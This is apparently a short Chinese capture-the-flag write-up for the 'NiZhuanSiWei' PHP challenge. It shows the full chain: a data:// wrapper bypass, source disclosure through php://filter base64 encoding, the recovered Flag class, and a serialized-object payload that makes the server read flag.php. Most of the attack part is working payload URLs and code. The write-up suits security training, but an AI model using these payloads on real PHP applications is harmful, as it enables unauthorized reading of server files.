---
title: NiZhuanSiWei
date: 2026-02-06 12:00:00
tags:
  - 题解
---

这道题用data协议绕过第一个限制，然后flag被禁止了题目提示useless.php，构造payload

?text=data://text/plain,welcome%20to%20the%20zjctf&file=php://filter/convert.base64-encode/resource=useless.php

然后得到一段base64编码解码后得到useless.php

<?php  

class Flag{  //flag.php  

    public $file;  

    public function __tostring(){  

        if(isset($this->file)){  

            echo file_get_contents($this->file); 

            echo "<br>";

        return ("U R SO CLOSE !///COME ON PLZ");

        }  

    }  

}  

?>  

`这里让password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}去得到flag`

`最后payload：?text=data://text/plain,welcome%20to%20the%20zjctf&file=useless.php&password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}`

`查看源码得到flag`

``